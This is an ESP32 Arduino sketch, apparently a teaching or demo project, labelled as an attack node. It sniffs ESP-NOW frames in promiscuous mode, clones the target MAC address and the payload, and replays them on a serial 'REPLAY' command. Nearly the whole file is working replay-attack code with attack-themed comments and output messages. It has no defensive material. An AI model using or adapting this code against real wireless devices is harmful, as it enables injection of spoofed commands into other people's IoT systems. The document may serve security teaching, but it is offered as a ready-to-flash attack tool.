#include <WiFi.h>
#include "esp_wifi.h"
#include <esp_now.h>

// Variables to store the cloned packet
uint8_t targetMAC[6]; 
uint8_t clonedPayload[250];
int clonedLength = 0;
bool packetCaptured = false;

// ---------------- EAVESDROPPING MODULE ----------------
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  int len = pkt->rx_ctrl.sig_len;
  
  // Filter for ESP-NOW Action Frames (Starts with 0xD0)
  if (pkt->payload[0] == 0xD0 && len > 30) {
    
    // 1. CLONE THE DESTINATION MAC ADDRESS (Bytes 4 to 9)
    for (int i = 0; i < 6; i++) { 
      targetMAC[i] = pkt->payload[4 + i]; 
    }
    
    // 2. CLONE THE ENTIRE PAYLOAD
    for (int i = 0; i < len; i++) { 
      clonedPayload[i] = pkt->payload[i]; 
    }
    clonedLength = len;
    packetCaptured = true;

    // 3. Print the capture to the HTML Terminal
    Serial.print("[INTERCEPT] Cloned Packet for Target: ");
    for (int i = 0; i < 6; i++) { 
      Serial.printf("%02X", targetMAC[i]);
      if(i < 5) Serial.print(":"); 
    }
    Serial.println();
  }
}

void setup() {
  Serial.begin(115200); 
  WiFi.mode(WIFI_STA);
  
  // Lock onto Channel 1 like a Sniper
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  
  esp_now_init();

  Serial.println("[SYSTEM] Trudy's Attack Node Online. Awaiting USB link...");
}

// ---------------- ACTIVE ATTACK MODULE ----------------
void loop() {
  // Listen for the specific "REPLAY" command from the HTML Dashboard
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    
    if (input == "REPLAY") {
      if (packetCaptured) {
        Serial.println("[ATTACK] EXECUTING REPLAY EXPLOIT...");
        
        // Temporarily register the cloned MAC address so ESP-NOW will let us transmit
        esp_now_peer_info_t peerInfo = {};
        memcpy(peerInfo.peer_addr, targetMAC, 6);
        peerInfo.channel = 1; 
        peerInfo.encrypt = false;
        
        if (esp_now_add_peer(&peerInfo) != ESP_OK) {
          // If already exists, ignore the error
        }
        
        // 💥 FIRE THE CLONED PACKET INTO THE AIR 💥
        esp_now_send(targetMAC, clonedPayload, clonedLength);
        Serial.println("[ATTACK] PAYLOAD SUCCESSFULLY INJECTED!");
        
        // Clean up
        esp_now_del_peer(targetMAC);
        
      } else {
        Serial.println("[ERROR] NO PACKETS CLONED YET. AWAITING TARGET TRANSMISSION.");
      }
    }
  }
}